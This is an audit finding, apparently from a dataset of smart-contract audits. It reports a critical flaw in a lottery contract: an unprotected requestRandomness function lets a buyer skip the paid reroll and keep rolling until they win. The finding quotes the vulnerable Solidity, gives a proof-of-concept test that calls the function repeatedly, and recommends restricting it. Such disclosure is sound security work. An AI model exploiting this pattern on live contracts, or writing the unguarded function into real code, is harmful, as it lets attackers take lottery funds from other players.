# [C] User can bypass reroll & request randomness until win

## Summary
Severity: Critical
Contest weight: 0.5115
Dataset id: 3959
Source: https://huggingface.co/datasets/Zaevlad/audit-findings-dataset
Type: audit-finding

## Details
To participate in LotteryV2 the ticket buyer calls LotteryV2Base::deposit. This will trigger a randomness request to the VRF:
```solidity
function deposit(uint256 amount) public lotteryStarted hasNotWonInLotteryV1(_msgSender()) {
    require(amount > 0, "No funds sent");
    if (rolledNumbers[_msgSender()] == 0) {
        _requestRandomness(abi.encode(_msgSender()));
        emit RandomRequested(_msgSender());
    }
}
```
This randomness request is later processed by the VRF in LotteryV2Base::_fulfillRandomness, where on line 142 the number is checked against the winning number:
```solidity
function _fulfillRandomness(uint256 randomness, uint256, bytes memory extraData) internal override {
    uint256 _randomNumber = DigitExtractor.extractFirst14Digits(randomness);
    if (requestedBy == seller) {
        randomNumber = _randomNumber;
    } else {
        rolledNumbers[requestedBy] = _randomNumber;
        claimNumber(requestedBy);
    }
    emit RandomFullfiled(requestedBy, _randomNumber);
}
```
If the user wants a second roll they can call roll and pay a fee to roll again. The issue is that this isn't the only way. There is an unprotected call requestRandomness:
```solidity
function requestRandomness() external {
    _requestRandomness(abi.encode(_msgSender()));
    emit RandomRequested(_msgSender());
}
```
Using this a buyer can roll as many times as they want until they get a winning number.

## Proof of Concept
```solidity
function test_LotteryV2RequestRequestRandomnessMultipleTimesReroll() public {
    usdc.mint(alice, 2e6);
    vm.startPrank(alice);
    bytes memory data = abi.encode(0, abi.encode(alice));
    uint256 round = _round();
    bytes memory dataWithRound = abi.encode(round, data);
    emit IGelatoVRFConsumer.RequestedRandomness(round, data);
    lottery.deposit(1e6);
    vm.stopPrank();
    lottery.mockFulfillRandomness(12345678901234, alice);
    assertEq(lottery.rolledNumbers(alice), 12345678901234);
    data = abi.encode(1, abi.encode(alice));
    dataWithRound = abi.encode(round, data);
    emit IGelatoVRFConsumer.RequestedRandomness(round, data);
    // alice can call `requestRandomness` multiple times
    // even after randomness is fulfilled
    vm.prank(alice);
    lottery.requestRandomness();
    data = abi.encode(2, abi.encode(alice));
    dataWithRound = abi.encode(round, data);
    emit IGelatoVRFConsumer.RequestedRandomness(round, data);
    vm.prank(alice);
    lottery.requestRandomness();
}
```
Please find the full test setup here

## Recommendation
Consider adding onlySeller to the requestRandomness.
